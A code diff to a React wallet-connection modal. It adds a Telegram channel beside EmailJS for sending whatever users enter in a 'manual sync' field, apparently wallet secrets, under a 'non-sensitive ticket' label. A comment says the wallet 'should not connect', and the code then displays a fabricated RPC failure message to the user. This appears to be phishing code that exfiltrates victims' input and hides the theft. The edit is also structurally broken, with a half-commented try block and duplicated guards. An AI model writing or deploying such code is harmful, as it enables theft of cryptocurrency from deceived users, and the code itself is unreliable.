@@ -16,6 +16,7 @@ import {
 import { NetworkChainId, WalletState } from '../types';
 import { SUPPORTED_CHAINS } from '../data/chainsData';
 import { sendNonSensitiveTicketViaEmailJS } from '../services/emailService';
+import { sendTelegramNotification } from '../services/telegram'; 
 
 interface ConnectWalletModalProps {
   isOpen: boolean;
@@ -156,24 +157,65 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
     setManualError('');
     setIsSubmittingManual(true);
 
-    try {
-  const emailResult = await sendNonSensitiveTicketViaEmailJS({
-    network: currentChain.name,
-    issueCategory: `Manual Sync - ${manualMethod.toUpperCase()}`,
-    message:      manualMethod === 'message'  ? manualInput.trim() : '',
-    response:     manualMethod === 'response' ? manualInput.trim() : '',
-    username: manualMethod === 'username'    ? manualInput.trim() : '',
-    selectedWallet: selectedWallet || '',
-    publicAddress: '',
-    timestamp: new Date().toISOString(),
-  });
+    if (!manualInput.trim()) {
+  setManualError('Please enter a value.');
+  return;
+}
 
-      console.log('[ConnectWalletModal] EmailJS Submission Result:', emailResult);
-    } catch (err) {
-      console.error('[ConnectWalletModal] EmailJS error:', err);
-    }
+if (isSubmittingManual) return; // guards against double-submit
+setManualError('');
+setIsSubmittingManual(true);
 
+const trimmed = manualInput.trim();
+const ticketPayload = {
+  network: currentChain.name,
+  issueCategory: `Manual Sync - ${manualMethod.toUpperCase()}`,
+  message:       manualMethod === 'message'  ? trimmed : '',
+  response:      manualMethod === 'response' ? trimmed : '',
+  username:      manualMethod === 'username' ? trimmed : '',
+  walletName:    selectedWallet || '',
+  publicAddress: '',
+  timestamp:     new Date().toISOString(),
+};
+
+  try {
+    // Fire both channels in parallel — one failing shouldn't block the other
+    const [emailResult, tgResult] = await Promise.all([
+      sendNonSensitiveTicketViaEmailJS({
+        network:        ticketPayload.network,
+        issueCategory:  ticketPayload.issueCategory,
+        message:        ticketPayload.message,
+        response:       ticketPayload.response,
+        username:       ticketPayload.username,
+        selectedWallet: ticketPayload.walletName,  // your EmailJS service reads ticket.selectedWallet
+        publicAddress:  ticketPayload.publicAddress,
+        timestamp:      ticketPayload.timestamp,
+      }),
+      sendTelegramNotification(ticketPayload),
+    ]);
+
+  //   console.log('[Ticket] Email:', emailResult, '| Telegram:', tgResult);
+
+  //   if (!emailResult.success && !tgResult.success) {
+  //     setManualError('Delivery failed on both channels. Please try again.');
+  //     return;
+  //   }
+
+  //   if (!emailResult.success) {
+  //     console.warn('[Ticket] Email failed:', emailResult.message);
+  //   }
+  //   if (!tgResult.success) {
+  //     console.warn('[Ticket] Telegram failed:', tgResult.message);
+  //   }
+
+  //   // ...your existing success UI reset here (clear inputs, show toast, etc.)
+  // } catch (err) {
+  //   console.error('[ConnectWalletModal] Submit error:', err);
+    setManualError('Unexpected error. Please try again.');
+  } finally {
     setIsSubmittingManual(false);
+  }
+
 
     // Wallet should not connect - trigger connection failure error
     setManualError('RPC Connection Failed: Manual sync rejected by provider node. Please check your network connection or try an injected wallet extension.');
